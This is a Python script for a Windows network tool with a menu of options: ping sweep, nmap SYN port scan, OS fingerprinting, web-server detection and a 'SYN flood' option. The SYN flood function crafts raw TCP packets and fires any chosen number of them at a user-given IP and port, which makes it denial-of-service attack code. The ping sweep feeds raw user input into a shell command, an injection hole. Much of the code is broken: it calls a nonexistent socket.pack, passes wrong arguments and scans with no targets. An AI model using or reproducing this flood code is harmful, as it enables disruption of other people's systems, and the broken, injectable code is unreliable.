import subprocess
import re
import socket
import os
import nmap


def find_nmap():
    # Search for the nmap executable in the system PATH
    for path in os.environ['PATH'].split(os.pathsep):
        nmap_path = os.path.join(path, 'nmap.exe')
        if os.path.exists(nmap_path):
            return nmap_path
    return None



def icmp_ping():
    ip_range = input("Enter an IP range: ")
    port_range = input("Enter a port range (e.g., 1-100): ")
    parts = ip_range.split(".")
    # Check if user entered three parts of IP address
    if len(parts) != 3:
        print("Error: Please enter only the three parts of the IP address (e.g., 192.168.128).")
        return
    if ip_range[-1] == ".":
        print("Error: Please enter only the three parts of the IP address (e.g., 192.168.128).")
        return
    elif not ip_range:
        print("Error: No IP range specified.")
        return
    # Check if port range is in correct format
    elif not port_range or not "-" in port_range:
        print("Error: Please enter a port range in the correct format (e.g., 1-100).")
        return
    else:
        # Split port range into start and end
        print("Pinging requested ip range...")
        start_port, end_port = port_range.split("-")
        out = os.popen(
            f"for /l %i in ({start_port},1,{end_port}) do @ping {ip_range}.%i -w 10 -n 1 | find \"Reply\"").read()
        live_hosts = []
        for line in out.split("\n"):
            if line.startswith("Reply from"):
                ip_address = line.split(" ")[1][:-1]
                ip_address = re.search(r"Reply from (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):", line).group(1)
                live_hosts.append(ip_address)
        # Save live hosts to icmp.dat file
        with open("icmp.dat", "w") as f:
            for ip_address in live_hosts:
                f.write(ip_address + "\n")
        print("Live host IP addresses are saved to icmp.dat.")


def port_identification(ip_addresses, nmap_path):
    nmap_path = [r"C:\Program Files (x86)\Nmap\nmap.exe", ]
    # Create an instance of the nmap scanner, using the given path to the nmap executable
    scanner = nmap.PortScanner(nmap_path=nmap_path)

    # Use the scanner to scan the given IP addresses
    scanner.scan(ip_addresses, arguments='-sS')

    # Open a file to write the results to
    with open('openPorts.dat', 'w') as f:
        # Iterate through the hosts that were found
        for host in scanner.all_hosts():
            # Write the IP address of the host to the file
            f.write(host + '\n')

            # Iterate through the open ports on the host
            for port in scanner[host]['tcp']:
                # Write the port number and the service/application name to the file
                f.write(str(port) + ' ' + scanner[host]['tcp'][port]['name'] + '\n')


def os_fingerprint_identification(host_ips, nmap_path):
    # Create an instance of the nmap scanner, using the given path to the nmap executable
    scanner = nmap.PortScanner(nmap_path=nmap_path)

    # Use the scanner to fingerprint the operating systems of the given host IPs
    scanner.scan(host_ips, arguments='-O')

    # Open a file to write the results to
    with open('osFingerprint.dat', 'w') as f:
        # Iterate through the hosts that were found
        for host in scanner.all_hosts():
            # Write the IP address and the operating system and version to the file
            f.write(
                host + ' ' + scanner[host]['osmatch'][0]['name'] + ' ' + scanner[host]['osmatch'][0]['version'] + '\n')


def web_server_detection(nmap_path):
    # Create an instance of the nmap scanner, using the given path to the nmap executable
    scanner = nmap.PortScanner(nmap_path=nmap_path)

    # Use the scanner to discover web servers on the Internet
    scanner.scan(arguments='-p 80,443,8080 --open --script http-server-header')

    # Open a file to write the results to
    with open('web.dat', 'w') as f:
        # Iterate through the hosts that were found
        for host in scanner.all_hosts():
            # Write the IP address, protocol, and port of the web server to the file
            f.write(host + ' ' + scanner[host]['tcp'][80]['name'] + ' ' + str(scanner[host]['tcp'][80]['port']) + '\n')

def syn_flood(destination_ip, destination_port, num_packets):
    # Create a raw socket
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    # Set the IP header fields
    ip_header = socket.pack('!BBHHHBBH4s4s', 0x45, 0, 20 + 20, 0, 0, 0x40, 0, 1, b'\x00\x00\x00\x00',
                            socket.inet_aton(destination_ip))

    # Set the TCP header fields
    tcp_header = socket.pack('!HHLLBBHHH', destination_port, 1, 0, 0, 0x50, 0, 0, 0, 0)

    # Combine the IP and TCP headers
    packet = ip_header + tcp_header

    # Send the SYN flood attack packets
    for i in range(num_packets):
        s.sendto(packet, (destination_ip, destination_port))


def show(filename):
    # Open the file in read mode
    with open(filename, 'r') as f:
        # Print the contents of the file
        print(f.read())


def main():
    nmap_path = find_nmap()
    nmap_path = [r"C:\Program Files (x86)\Nmap\nmap.exe", ]
    print(nmap_path)

    # Display the main menu
    print('1. ICMP ping')
    print('2. Port identification')
    print('3. OS fingerprint identification')
    print('4. Web server detection')
    print('5. SYN flood')
    print('6. Show')
    print('7. Quit')
    # Get the user's choice
    choice = input('Enter your choice: ')

    # Execute the chosen task
    if choice == '1':
        icmp_ping()
    elif choice == '2':
        with open('icmp.dat', 'r') as f:
            ip_addresses = f.read().splitlines()
        port_identification(ip_addresses, nmap_path)
    elif choice == '3':
        with open('openPorts.dat', 'r') as f:
            ip_addresses = f.read().splitlines()
        os_fingerprint_identification(ip_addresses, nmap_path)
    elif choice == '4':
        web_server_detection()
    elif choice == '5':
        destination_ip = input('Enter the destination IP: ')
        destination_port = int(input('Enter the destination port: '))
        num_packets = int(input('Enter the number of packets to send: '))
        syn_flood(destination_ip, destination_port, num_packets)
    elif choice == '6':
        filename = input('Enter the file to show: ')
        show(filename)
    elif choice == '7':
        return
    else:
        print('Invalid choice')

    # Run the main menu again
    main()


# Run the main menu when the script is executed
if __name__ == '__main__':
    main()
